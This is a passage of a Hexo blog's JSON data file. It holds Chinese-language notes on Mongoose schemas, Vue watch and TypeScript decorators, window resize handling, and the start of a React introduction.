&apos;123456&apos;,</span><br><span class=\"line\">  host: &apos;localhost&apos;,</span><br><span class=\"line\">  port: &apos;27017&apos;,</span><br><span class=\"line\">  database: &apos;hollywood&apos;,</span><br><span class=\"line\">  authSource: &apos;admin&apos;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const uri = `mongodb://$&#123;options.user&#125;:$&#123;options.pwd&#125;@$&#123;options.host&#125;:$&#123;options.port&#125;/$&#123;options.database&#125;?authSource=$&#123;options.authSource&#125;`</span><br><span class=\"line\"></span><br><span class=\"line\">mongoose.Promise = global.Promise //需要</span><br><span class=\"line\">mongoose.connect(uri)</span><br><span class=\"line\"></span><br><span class=\"line\">export default mongoose</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>定义一个模型的概要，类似于关系型数据库中的定义表结构</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import db from &apos;../db.js&apos;</span><br><span class=\"line\">import logger from &apos;../logger&apos;</span><br><span class=\"line\">const Schema = db.Schema</span><br><span class=\"line\"></span><br><span class=\"line\">//account对应的字段</span><br><span class=\"line\">const accountSchema = new Schema(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    name: &#123; type: String, maxlength: 15 &#125;,</span><br><span class=\"line\">    password: &#123; type: String, maxlength: 20 &#125;,</span><br><span class=\"line\">    gender: &#123; type: String, enum: [&apos;male&apos;, &apos;female&apos;] &#125;,</span><br><span class=\"line\">    email: &#123; type: String, maxlength: 25 &#125;,</span><br><span class=\"line\">    avatar: &#123; type: String &#125;,</span><br><span class=\"line\">    age: &#123; type: Number &#125;,</span><br><span class=\"line\">    create_date: &#123; type: Date &#125;,</span><br><span class=\"line\">    update_date: &#123; type: Date &#125;,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    versionKey: false,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()前，执行该代码片段，有点类似于中间件(这个方法内容仅仅是介绍pre()的使用方法)</span><br><span class=\"line\">accountSchema.pre(&apos;save&apos;, function(next) &#123;</span><br><span class=\"line\">const currentDate = new Date()</span><br><span class=\"line\">if (!this.create_date) &#123;</span><br><span class=\"line\">        this.create_date = currentDate</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">        this.update_date = currentDate</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">next()</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//当account执行save()后</span><br><span class=\"line\">&gt; ...</span><br><span class=\"line\"></span><br><span class=\"line\">//定义模型的方法</span><br><span class=\"line\">accountSchema.methods.sayHi = () =&gt; (console.log(&apos;sayHi()!!!!!&apos;))</span><br><span class=\"line\">const Account = db.model(&apos;Account&apos;, accountSchema)</span><br><span class=\"line\">export default Account</span><br></pre></td></tr></table></figure>\n<p><strong>保存到数据库, 并返回一个保存到数据库的对象</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import Account from &apos;./model&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">export default class AccountService &#123;</span><br><span class=\"line\">  static async save(json) &#123;</span><br><span class=\"line\">    const accountModel = new Account(json)</span><br><span class=\"line\">    const account = await accountModel.save()</span><br><span class=\"line\">    return account</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"TS-VUE-Watch属性","date":"2018-05-24T10:23:12.000Z","_content":"## vue的Watch在tsx中用法\n### [转：vue + typescript 项目起手式](https://segmentfault.com/a/1190000011744210)\n\n[vue-property-decorator:官方文档](https://github.com/kaorun343/vue-property-decorator)\n````\nimport { Component, Prop, Provide, Watch } from 'vue-property-decorator'\n\n@Watch('$route', { immediate: true, deep: true })\non$routeChanged(val: any, oldVal: any) {\n        this.cardList()\n}\n````","source":"_posts/WebFrameWork/Vue/TS-VUE-Watch属性.md","raw":"---\ntitle: TS-VUE-Watch属性\ndate: 2018-05-24 18:23:12\ntags: TSX-Watch\ncategories: TSX-VUE-Watch\n---\n## vue的Watch在tsx中用法\n### [转：vue + typescript 项目起手式](https://segmentfault.com/a/1190000011744210)\n\n[vue-property-decorator:官方文档](https://github.com/kaorun343/vue-property-decorator)\n````\nimport { Component, Prop, Provide, Watch } from 'vue-property-decorator'\n\n@Watch('$route', { immediate: true, deep: true })\non$routeChanged(val: any, oldVal: any) {\n        this.cardList()\n}\n````","slug":"WebFrameWork/Vue/TS-VUE-Watch属性","published":1,"updated":"2018-05-25T01:00:31.414Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2d8007wb8xj3mn0aov5","content":"<h2 id=\"vue的Watch在tsx中用法\"><a href=\"#vue的Watch在tsx中用法\" class=\"headerlink\" title=\"vue的Watch在tsx中用法\"></a>vue的Watch在tsx中用法</h2><h3 id=\"转：vue-typescript-项目起手式\"><a href=\"#转：vue-typescript-项目起手式\" class=\"headerlink\" title=\"转：vue + typescript 项目起手式\"></a><a href=\"https://segmentfault.com/a/1190000011744210\" target=\"_blank\" rel=\"noopener\">转：vue + typescript 项目起手式</a></h3><p><a href=\"https://github.com/kaorun343/vue-property-decorator\" target=\"_blank\" rel=\"noopener\">vue-property-decorator:官方文档</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; Component, Prop, Provide, Watch &#125; from &apos;vue-property-decorator&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">@Watch(&apos;$route&apos;, &#123; immediate: true, deep: true &#125;)</span><br><span class=\"line\">on$routeChanged(val: any, oldVal: any) &#123;</span><br><span class=\"line\">        this.cardList()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"vue的Watch在tsx中用法\"><a href=\"#vue的Watch在tsx中用法\" class=\"headerlink\" title=\"vue的Watch在tsx中用法\"></a>vue的Watch在tsx中用法</h2><h3 id=\"转：vue-typescript-项目起手式\"><a href=\"#转：vue-typescript-项目起手式\" class=\"headerlink\" title=\"转：vue + typescript 项目起手式\"></a><a href=\"https://segmentfault.com/a/1190000011744210\" target=\"_blank\" rel=\"noopener\">转：vue + typescript 项目起手式</a></h3><p><a href=\"https://github.com/kaorun343/vue-property-decorator\" target=\"_blank\" rel=\"noopener\">vue-property-decorator:官方文档</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; Component, Prop, Provide, Watch &#125; from &apos;vue-property-decorator&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">@Watch(&apos;$route&apos;, &#123; immediate: true, deep: true &#125;)</span><br><span class=\"line\">on$routeChanged(val: any, oldVal: any) &#123;</span><br><span class=\"line\">        this.cardList()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"VUE获取当前路由的API","date":"2018-05-24T06:58:37.000Z","_content":"","source":"_posts/WebFrameWork/Vue/VUE获取当前路由的API.md","raw":"---\ntitle: VUE获取当前路由的API\ndate: 2018-05-24 14:58:37\ntags:\ncategories:\n---\n","slug":"WebFrameWork/Vue/VUE获取当前路由的API","published":1,"updated":"2018-05-24T10:23:17.663Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2df0081b8xjvi66gy99","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Vtsx判断绑定多class名","date":"2018-06-04T03:18:10.000Z","_content":"### vtsx绑定多类名表达式\n````\nclass={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}\n\n````","source":"_posts/WebFrameWork/Vue/Vtsx判断绑定多class名.md","raw":"---\ntitle: Vtsx判断绑定多class名\ndate: 2018-06-04 11:18:10\ntags: vtsx多类名\ncategories: Vtsx\n---\n### vtsx绑定多类名表达式\n````\nclass={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}\n\n````","slug":"WebFrameWork/Vue/Vtsx判断绑定多class名","published":1,"updated":"2018-06-04T03:19:26.101Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2dg0083b8xjrvk4hcwp","content":"<h3 id=\"vtsx绑定多类名表达式\"><a href=\"#vtsx绑定多类名表达式\" class=\"headerlink\" title=\"vtsx绑定多类名表达式\"></a>vtsx绑定多类名表达式</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"vtsx绑定多类名表达式\"><a href=\"#vtsx绑定多类名表达式\" class=\"headerlink\" title=\"vtsx绑定多类名表达式\"></a>vtsx绑定多类名表达式</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Watch用法详解","date":"2018-05-26T01:23:17.000Z","_content":"\nVue.js 提供了一个方法 `watch`，它用于观察`Vue实例`上的`数据变动`。对应一个对象，`键是观察表达式`，`值是对应回调`。\n值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。\n\n````\n<span style=\"color:#006600;\"><div id=\"app\">  \n    <input type=\"text\" v-model:value=\"childrens.name\" />  \n    <input type=\"text\" v-model:value=\"lastName\" />  \n</div>  \n  \n<script type=\"text/javascript\">     \n    var vm = new Vue( {  \n        el: '#app',  \n        data: {  \n            childrens: {  \n                name: '小强',  \n                age: 20,  \n                sex: '男'  \n            },  \n            tdArray:[\"1\",\"2\"],  \n            lastName:\"张三\"  \n        },  \n        watch:{  \n            childrens:{  \n                handler:function(val,oldval){  \n                    console.log(val.name)  \n                },  \n                deep:true//对象内部的属性监听，也叫深度监听  \n            },  \n            'childrens.name':function(val,oldval){  \n                console.log(val+\"aaa\")  \n            },//键路径必须加上引号  \n            lastName:function(val,oldval){  \n                console.log(this.lastName)  \n            }  \n        },//以V-model绑定数据时使用的数据变化监测  \n    } );  \n    vm.$watch(\"lastName\",function(val,oldval){  \n        console.log(val)  \n    })//主动调用$watch方法来进行数据监测</span>  \n</script>  \n````\n---\n[阅读原文](https://blog.csdn.net/itkingone/article/details/69568498)\n\n[另附: [Angular中使用$watch监听object属性值的变化](https://blog.csdn.net/u014291497/article/details/52245651)]\n\n---","source":"_posts/WebFrameWork/Vue/Watch用法详解.md","raw":"---\ntitle: Watch用法详解\ndate: 2018-05-26 09:23:17\ntags: Watch-监听属性\ncategories: Vue-Watch\n---\n\nVue.js 提供了一个方法 `watch`，它用于观察`Vue实例`上的`数据变动`。对应一个对象，`键是观察表达式`，`值是对应回调`。\n值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。\n\n````\n<span style=\"color:#006600;\"><div id=\"app\">  \n    <input type=\"text\" v-model:value=\"childrens.name\" />  \n    <input type=\"text\" v-model:value=\"lastName\" />  \n</div>  \n  \n<script type=\"text/javascript\">     \n    var vm = new Vue( {  \n        el: '#app',  \n        data: {  \n            childrens: {  \n                name: '小强',  \n                age: 20,  \n                sex: '男'  \n            },  \n            tdArray:[\"1\",\"2\"],  \n            lastName:\"张三\"  \n        },  \n        watch:{  \n            childrens:{  \n                handler:function(val,oldval){  \n                    console.log(val.name)  \n                },  \n                deep:true//对象内部的属性监听，也叫深度监听  \n            },  \n            'childrens.name':function(val,oldval){  \n                console.log(val+\"aaa\")  \n            },//键路径必须加上引号  \n            lastName:function(val,oldval){  \n                console.log(this.lastName)  \n            }  \n        },//以V-model绑定数据时使用的数据变化监测  \n    } );  \n    vm.$watch(\"lastName\",function(val,oldval){  \n        console.log(val)  \n    })//主动调用$watch方法来进行数据监测</span>  \n</script>  \n````\n---\n[阅读原文](https://blog.csdn.net/itkingone/article/details/69568498)\n\n[另附: [Angular中使用$watch监听object属性值的变化](https://blog.csdn.net/u014291497/article/details/52245651)]\n\n---","slug":"WebFrameWork/Vue/Watch用法详解","published":1,"updated":"2018-05-26T01:31:19.313Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2dj0087b8xj3229sjns","content":"<p>Vue.js 提供了一个方法 <code>watch</code>，它用于观察<code>Vue实例</code>上的<code>数据变动</code>。对应一个对象，<code>键是观察表达式</code>，<code>值是对应回调</code>。<br>值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;span style=&quot;color:#006600;&quot;&gt;&lt;div id=&quot;app&quot;&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;childrens.name&quot; /&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;lastName&quot; /&gt;  </span><br><span class=\"line\">&lt;/div&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;     </span><br><span class=\"line\">    var vm = new Vue( &#123;  </span><br><span class=\"line\">        el: &apos;#app&apos;,  </span><br><span class=\"line\">        data: &#123;  </span><br><span class=\"line\">            childrens: &#123;  </span><br><span class=\"line\">                name: &apos;小强&apos;,  </span><br><span class=\"line\">                age: 20,  </span><br><span class=\"line\">                sex: &apos;男&apos;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            tdArray:[&quot;1&quot;,&quot;2&quot;],  </span><br><span class=\"line\">            lastName:&quot;张三&quot;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        watch:&#123;  </span><br><span class=\"line\">            childrens:&#123;  </span><br><span class=\"line\">                handler:function(val,oldval)&#123;  </span><br><span class=\"line\">                    console.log(val.name)  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                deep:true//对象内部的属性监听，也叫深度监听  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &apos;childrens.name&apos;:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(val+&quot;aaa&quot;)  </span><br><span class=\"line\">            &#125;,//键路径必须加上引号  </span><br><span class=\"line\">            lastName:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(this.lastName)  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;,//以V-model绑定数据时使用的数据变化监测  </span><br><span class=\"line\">    &#125; );  </span><br><span class=\"line\">    vm.$watch(&quot;lastName&quot;,function(val,oldval)&#123;  </span><br><span class=\"line\">        console.log(val)  </span><br><span class=\"line\">    &#125;)//主动调用$watch方法来进行数据监测&lt;/span&gt;  </span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/itkingone/article/details/69568498\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<p>[另附: <a href=\"https://blog.csdn.net/u014291497/article/details/52245651\" target=\"_blank\" rel=\"noopener\">Angular中使用$watch监听object属性值的变化</a>]</p>\n<hr>\n","site":{"data":{}},"excerpt":"","more":"<p>Vue.js 提供了一个方法 <code>watch</code>，它用于观察<code>Vue实例</code>上的<code>数据变动</code>。对应一个对象，<code>键是观察表达式</code>，<code>值是对应回调</code>。<br>值也可以是方法名，或者是对象，包含选项。具体的用法可以直接看下面的示例，简单直接。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;span style=&quot;color:#006600;&quot;&gt;&lt;div id=&quot;app&quot;&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;childrens.name&quot; /&gt;  </span><br><span class=\"line\">    &lt;input type=&quot;text&quot; v-model:value=&quot;lastName&quot; /&gt;  </span><br><span class=\"line\">&lt;/div&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;     </span><br><span class=\"line\">    var vm = new Vue( &#123;  </span><br><span class=\"line\">        el: &apos;#app&apos;,  </span><br><span class=\"line\">        data: &#123;  </span><br><span class=\"line\">            childrens: &#123;  </span><br><span class=\"line\">                name: &apos;小强&apos;,  </span><br><span class=\"line\">                age: 20,  </span><br><span class=\"line\">                sex: &apos;男&apos;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            tdArray:[&quot;1&quot;,&quot;2&quot;],  </span><br><span class=\"line\">            lastName:&quot;张三&quot;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        watch:&#123;  </span><br><span class=\"line\">            childrens:&#123;  </span><br><span class=\"line\">                handler:function(val,oldval)&#123;  </span><br><span class=\"line\">                    console.log(val.name)  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                deep:true//对象内部的属性监听，也叫深度监听  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &apos;childrens.name&apos;:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(val+&quot;aaa&quot;)  </span><br><span class=\"line\">            &#125;,//键路径必须加上引号  </span><br><span class=\"line\">            lastName:function(val,oldval)&#123;  </span><br><span class=\"line\">                console.log(this.lastName)  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;,//以V-model绑定数据时使用的数据变化监测  </span><br><span class=\"line\">    &#125; );  </span><br><span class=\"line\">    vm.$watch(&quot;lastName&quot;,function(val,oldval)&#123;  </span><br><span class=\"line\">        console.log(val)  </span><br><span class=\"line\">    &#125;)//主动调用$watch方法来进行数据监测&lt;/span&gt;  </span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/itkingone/article/details/69568498\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n<p>[另附: <a href=\"https://blog.csdn.net/u014291497/article/details/52245651\" target=\"_blank\" rel=\"noopener\">Angular中使用$watch监听object属性值的变化</a>]</p>\n<hr>\n"},{"title":"Vue-动态路由匹配","date":"2018-05-31T07:41:49.000Z","_content":"","source":"_posts/WebFrameWork/Vue/Vue-动态路由匹配.md","raw":"---\ntitle: Vue-动态路由匹配\ndate: 2018-05-31 15:41:49\ntags:\ncategories:\n---\n","slug":"WebFrameWork/Vue/Vue-动态路由匹配","published":1,"updated":"2018-06-04T03:18:16.681Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2dk008ab8xjnmn8v3v2","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"vue-resize","date":"2018-05-14T07:59:59.000Z","_content":"## 主要记录方案二：\n\n在vue 2.x 里面的时候，可以在 `mounted` 钩子中 全局监听 `resize` 事件，然后绑定的函数再做具体的处理。\n\n````\ndata(){\n    return {\n        clientHeight: '600px',\n    },\n},\nmounted() {\n    // 动态设置背景图的高度为浏览器可视区域高度\n\n    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．\n    > this.clientHeight.height = `${document.documentElement.clientHeight}px`;\n    \n    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．\n    > const that = this;\n    > window.onresize = function temp() {\n    >     that.clientHeight = `${document.documentElement.clientHeight}px`;\n    > };\n},\n````\n\n-----------------\n[阅读原文](https://blog.csdn.net/qq_25386583/article/details/77161478)","source":"_posts/WebFrameWork/Vue/vue-resize.md","raw":"---\ntitle: vue-resize\ndate: 2018-05-14 15:59:59\ntags: VueJs 监听 window.resize\ncategories: VUE\n---\n## 主要记录方案二：\n\n在vue 2.x 里面的时候，可以在 `mounted` 钩子中 全局监听 `resize` 事件，然后绑定的函数再做具体的处理。\n\n````\ndata(){\n    return {\n        clientHeight: '600px',\n    },\n},\nmounted() {\n    // 动态设置背景图的高度为浏览器可视区域高度\n\n    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．\n    > this.clientHeight.height = `${document.documentElement.clientHeight}px`;\n    \n    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．\n    > const that = this;\n    > window.onresize = function temp() {\n    >     that.clientHeight = `${document.documentElement.clientHeight}px`;\n    > };\n},\n````\n\n-----------------\n[阅读原文](https://blog.csdn.net/qq_25386583/article/details/77161478)","slug":"WebFrameWork/Vue/vue-resize","published":1,"updated":"2018-05-14T08:13:53.635Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2dm008eb8xj75ruyq7f","content":"<h2 id=\"主要记录方案二：\"><a href=\"#主要记录方案二：\" class=\"headerlink\" title=\"主要记录方案二：\"></a>主要记录方案二：</h2><p>在vue 2.x 里面的时候，可以在 <code>mounted</code> 钩子中 全局监听 <code>resize</code> 事件，然后绑定的函数再做具体的处理。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data()&#123;</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">        clientHeight: &apos;600px&apos;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">mounted() &#123;</span><br><span class=\"line\">    // 动态设置背景图的高度为浏览器可视区域高度</span><br><span class=\"line\"></span><br><span class=\"line\">    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．</span><br><span class=\"line\">    &gt; this.clientHeight.height = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．</span><br><span class=\"line\">    &gt; const that = this;</span><br><span class=\"line\">    &gt; window.onresize = function temp() &#123;</span><br><span class=\"line\">    &gt;     that.clientHeight = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    &gt; &#125;;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/qq_25386583/article/details/77161478\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"主要记录方案二：\"><a href=\"#主要记录方案二：\" class=\"headerlink\" title=\"主要记录方案二：\"></a>主要记录方案二：</h2><p>在vue 2.x 里面的时候，可以在 <code>mounted</code> 钩子中 全局监听 <code>resize</code> 事件，然后绑定的函数再做具体的处理。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data()&#123;</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">        clientHeight: &apos;600px&apos;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">mounted() &#123;</span><br><span class=\"line\">    // 动态设置背景图的高度为浏览器可视区域高度</span><br><span class=\"line\"></span><br><span class=\"line\">    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．</span><br><span class=\"line\">    &gt; this.clientHeight.height = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．</span><br><span class=\"line\">    &gt; const that = this;</span><br><span class=\"line\">    &gt; window.onresize = function temp() &#123;</span><br><span class=\"line\">    &gt;     that.clientHeight = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    &gt; &#125;;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/qq_25386583/article/details/77161478\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"React-入门","date":"2017-09-13T07:21:11.000Z","archives":"Front-end","_content":"<h2>入门</h2>\n<ol>\n  <li>一个核心思想——组件化</li>\n  <li>两位带头大哥——react & react-dom</li>\n  <li>一个基本运作方式——数据驱动视图</li>\n  <li>一位神秘卧底——jsx语法</li>\n  <li>三位护法——state（状态）、props（属性）、refs（实例）</li>\n  